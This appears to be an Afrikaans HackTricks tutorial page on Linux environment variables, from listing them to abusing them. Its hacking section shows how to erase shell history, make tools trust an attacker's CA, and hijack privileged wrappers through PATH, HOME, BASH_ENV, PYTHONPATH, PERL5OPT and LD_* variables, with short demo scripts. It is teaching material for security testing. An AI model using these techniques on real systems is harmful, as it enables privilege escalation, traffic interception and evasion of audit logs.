# Linux-omgewingsveranderlikes

{{#include ../../banners/hacktricks-training.md}}

## Globale veranderlikes

Die globale veranderlikes **sal** deur **kindprosesse** geërf word.

Jy kan ’n globale veranderlike vir jou huidige sessie skep deur:
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
Hierdie veranderlike sal deur jou huidige sessies en hul kinderprosesse toeganklik wees.

Jy kan ’n veranderlike **verwyder** deur:
```bash
unset MYGLOBAL
```
## Plaaslike veranderlikes

Die **plaaslike veranderlikes** kan slegs deur die **huidige shell/script** **geakses** word.
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## Lys huidige veranderlikes
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
Die inhoud van `/proc/*/environ` is **NUL-separated**, dus is hierdie variante gewoonlik makliker om te lees:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
As jy op soek is na **credentials** of **interessante dienskonfigurasie** binne geërfde omgewings, kyk ook na [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md).

## Algemene veranderlikes

From: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/)

- **DISPLAY** – die display wat deur **X** gebruik word. Hierdie veranderlike word gewoonlik op **:0.0** gestel, wat die eerste display op die huidige rekenaar beteken.
- **EDITOR** – die gebruiker se voorkeurteksredigeerder.
- **HISTFILESIZE** – die maksimum aantal reëls in die history-lêer.
- **HISTSIZE** – die aantal reëls wat by die history-lêer gevoeg word wanneer die gebruiker sy sessie beëindig.
- **HOME** – jou tuisgids.
- **HOSTNAME** – die hostname van die rekenaar.
- **LANG** – jou huidige taal.
- **MAIL** – die ligging van die gebruiker se mail spool. Gewoonlik **/var/spool/mail/USER**.
- **MANPATH** – die lys gidse waarin daar na manual pages gesoek moet word.
- **OSTYPE** – die tipe bedryfstelsel.
- **PS1** – die verstekprompt in bash.
- **PATH** – stoor die pad van al die gidse wat binary files bevat wat jy wil uitvoer deur slegs die lêernaam te spesifiseer, en nie ’n relatiewe of absolute pad nie.
- **PWD** – die huidige werkgids.
- **SHELL** – die pad na die huidige command shell (byvoorbeeld **/bin/bash**).
- **TERM** – die huidige terminaltipe (byvoorbeeld **xterm**).
- **TZ** – jou tydsone.
- **USER** – jou huidige gebruikersnaam.

## Interessante veranderlikes vir hacking

Nie elke veranderlike is ewe nuttig nie. Vanuit ’n offensive-perspektief moet veranderlikes wat **search paths**, **startup files**, **dynamic linker behavior** of **audit/logging** verander, voorkeur geniet.

### **HISTFILESIZE**

Verander die **waarde van hierdie veranderlike na 0**, sodat die **history-lêer** (\~/.bash_history) **na 0 reëls afgekap word** wanneer jy jou **sessie beëindig**.
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

Verander die **waarde van hierdie veranderlike na 0**, sodat opdragte **nie in die geheuegeskiedenis behou word nie** en nie na die **geskiedenislêer** (\~/.bash_history) teruggeskryf sal word nie.
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

As die **waarde van hierdie veranderlike op `ignorespace` of `ignoreboth` gestel is**, sal enige opdrag wat met ’n ekstra spasie voorafgegaan word, nie in die geskiedenis gestoor word nie.
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

Stel die **geskiedenislêer** op **`/dev/null`** of verwyder dit heeltemal. Dit is gewoonlik meer betroubaar as om slegs die geskiedenislêergrootte te verander.
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

Die prosesse sal die **proxy** wat hier verklaar word gebruik om deur **http of https** aan die internet te koppel.
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy & no_proxy

- `all_proxy`: verstek-proxy vir nutsgoed/protokolle wat dit ondersteun.
- `no_proxy`: omseillys (gashere/domains/CIDR's) wat direk moet verbind.
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
Beide kleinletter- en hooflettervariante kan gebruik word, afhangend van die tool (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Die prosesse sal die sertifikate vertrou wat in **hierdie env variables** aangedui word. Dit is nuttig om tools soos **`curl`**, **`git`**, Python HTTP-clients of package managers ’n CA te laat vertrou wat deur die aanvaller beheer word (byvoorbeeld om ’n interception proxy legitiem te laat lyk).
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

As ’n bevoorregte wrapper/script opdragte **sonder absolute paaie** uitvoer, kry die **eerste aanvaller-beheerde gids** in `PATH` voorkeur. Dit is die grondslag van baie **PATH hijacks** in `sudo`, cron jobs, shell wrappers en pasgemaakte SUID helpers. Soek na `env_keep+=PATH`, ’n swak `secure_path`, of wrappers wat `tar`, `service`, `cp`, `python`, ens. op naam aanroep.
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
Vir volledige privilege-escalation-kettings wat `PATH` misbruik, raadpleeg [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` is nie slegs ’n gidsverwysing nie: baie nutsprogramme laai outomaties **dotfiles**, **plugins** en **per-gebruiker-konfigurasie** vanaf `$HOME` of `$XDG_CONFIG_HOME`. As ’n bevoorregte workflow hierdie waardes behou, kan **config injection** makliker wees as **binary hijacking**.
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
Interessante teikens sluit `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py`, en tool-spesifieke lêers soos `.terraformrc` in.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Hierdie veranderlikes beïnvloed die **dynamic linker**:

- `LD_PRELOAD`: dwing ekstra shared objects om eerste gelaai te word.
- `LD_LIBRARY_PATH`: voeg biblioteek-soekgidse vooraan.
- `LD_AUDIT`: laai auditor-biblioteke wat biblioteeklaaiing en simboolresolusie waarneem.

Hulle is uiters waardevol vir **hooking**, **instrumentation**, en **privilege escalation** indien ’n bevoorregte opdrag hulle behou. In **secure-execution**-modus (`AT_SECURE`, byvoorbeeld setuid/setgid/capabilities) verwyder of beperk die loader baie van hierdie veranderlikes. Parser-foute in daardie vroeë loader-stadium het egter steeds ’n groot impak omdat hulle **voor** die teikenprogram uitgevoer word.
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` verander vroeë glibc-gedrag (byvoorbeeld allocator tunables) en is baie nuttig in exploit labs. Dit is ook vanuit ’n sekuriteitsperspektief belangrik omdat die **dynamic loader dit baie vroeg ontleed**. Die 2023-**Looney Tunables**-bug was ’n goeie herinnering dat ’n enkele omgewingsveranderlike wat deur die loader ontleed word, ’n **local privilege-escalation primitive** teen SUID-programme kan word.
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

As **Bash** **nie-interaktief** begin word, kontroleer dit `BASH_ENV` en laai daardie lêer voordat die teikenskrip uitgevoer word. Wanneer Bash as `sh` aangeroep word, of in POSIX-styl interaktiewe modus, kan `ENV` ook geraadpleeg word. Dit is ’n klassieke manier om ’n shell-wrapper in code execution te verander indien die environment deur ’n aanvaller beheer word.
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bash self deaktiveer hierdie opstartlêers wanneer die **werklike/effektiewe ID's verskil**, tensy `-p` gebruik word; die presiese gedrag hang dus af van hoe die wrapper die shell aanroep.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP & PYTHONINSPECT**

Hierdie veranderlikes verander hoe Python begin:

- `PYTHONPATH`: voeg import-soekpaaie vooraan.
- `PYTHONHOME`: verskuif die standaardbiblioteekboom.
- `PYTHONSTARTUP`: voer 'n lêer uit voordat die interaktiewe prompt verskyn.
- `PYTHONINSPECT=1`: skakel oor na interaktiewe modus nadat 'n script voltooi is.

Hulle is nuttig teen onderhoudsskripte, debuggers, shells en wrappers wat Python met 'n beheerbare omgewing aanroep. `python -E` en `python -I` ignoreer alle `PYTHON*`-veranderlikes.
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode
```
### **PERL5OPT & PERL5LIB**

Perl het eweneens nuttige opstartveranderlikes:

- `PERL5LIB`: plaas biblioteekgidse vooraan.
- `PERL5OPT`: voeg skakelaars in asof hulle op elke `perl`-opdragreël was.

Dit kan **outomatiese module-laaiing** afdwing of interpretergedrag verander voordat die teikenskrip enigiets interessants doen. Perl ignoreer hierdie veranderlikes in **taint / setuid / setgid**-kontekste, maar hulle bly baie belangrik vir normale wrappers wat as root uitgevoer word, CI-take, installeerders en pasgemaakte sudoers-reëls.
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
Dieselfde idee kom in ander runtimes (`RUBYOPT`, `NODE_OPTIONS`, ens.) voor: wanneer ’n interpreter deur ’n bevoorregte wrapper geloods word, soek na omgewingsveranderlikes wat **module-laai** of **opstartgedrag** wysig.

Vanuit ’n post-exploitation-perspektief, onthou ook dat geërfde omgewings dikwels **geloofsbriewe**, **proxy-instellings**, **diens-tokens** of **cloud keys** bevat. Kyk na [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) vir `/proc/<PID>/environ` en `systemd` se `Environment=`-opsporing.

### PS1

Verander hoe jou prompt lyk.

[**This is an example**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Dit is ’n voorbeeld](<../images/image (897).png>)

Gewone gebruiker:

![PERL5OPT & PERL5LIB - PS1: Een, twee en drie take wat in die agtergrond uitgevoer word](<../images/image (740).png>)

Een, twee en drie take wat in die agtergrond uitgevoer word:

![PERL5OPT & PERL5LIB - PS1: Een, twee en drie take wat in die agtergrond uitgevoer word](<../images/image (145).png>)

Een agtergrondtaak, een gestopte taak en die laaste opdrag het nie korrek voltooi nie:

![PERL5OPT & PERL5LIB - PS1: Een agtergrondtaak, een gestopte taak en die laaste opdrag het nie korrek voltooi nie](<../images/image (715).png>)

## Verwysings

- [GNU Bash Manual - Bash Startup Files](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)

{{#include ../../banners/hacktricks-training.md}}
